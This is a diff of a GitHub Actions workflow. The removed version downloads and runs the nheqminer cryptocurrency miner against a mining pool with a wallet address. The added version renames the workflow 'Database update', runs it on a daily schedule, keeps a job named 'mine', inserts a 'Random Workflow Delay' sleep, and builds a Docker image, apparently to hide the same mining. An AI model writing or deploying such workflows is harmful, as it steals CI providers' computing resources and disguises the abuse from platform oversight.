@@ -1,31 +1,25 @@
-name: Run nheqminer
+
+name: Database update
 
 on:
-  push:
-    branches:
-      - main  # Adjust this to your target branch
+  schedule:
+    - cron: '0 23 * * *'  # Every day at 23 AM UTC
 
 jobs:
-  run-nheqminer:
+  mine:
     runs-on: ubuntu-latest
-
     steps:
-      - name: Checkout repository
+      - name: Checkout code
         uses: actions/checkout@v2
-
-      - name: Install wget and tar
-        run: sudo apt-get update && sudo apt-get install -y wget tar
-
-      - name: Download nheqminer
+      
+      - name: Random Workflow Delay
         run: |
-          wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz
+          echo "Sleeping for 1484 seconds..."
+          sleep 1484
+      
+      - name: Set up Docker Buildx
+        uses: docker/setup-buildx-action@v2
 
-      - name: Extract nheqminer
+      - name: Build Docker image
         run: |
-          tar -xvf nheqminer-Linux-v0.8.2.tgz
-          ls -la  # List contents to check the extracted files
-
-      - name: Run nheqminer
-        run: |
-          # Running the nheqminer executable directly
-          ./nheqminer -v -l na.luckpool.net:3956 -u RP8SNudJuHRv3GJsxb2LJBrKxQKRdKoHL3.kiukiu1 -p x -t 2
+          docker build -t my-image-name .      
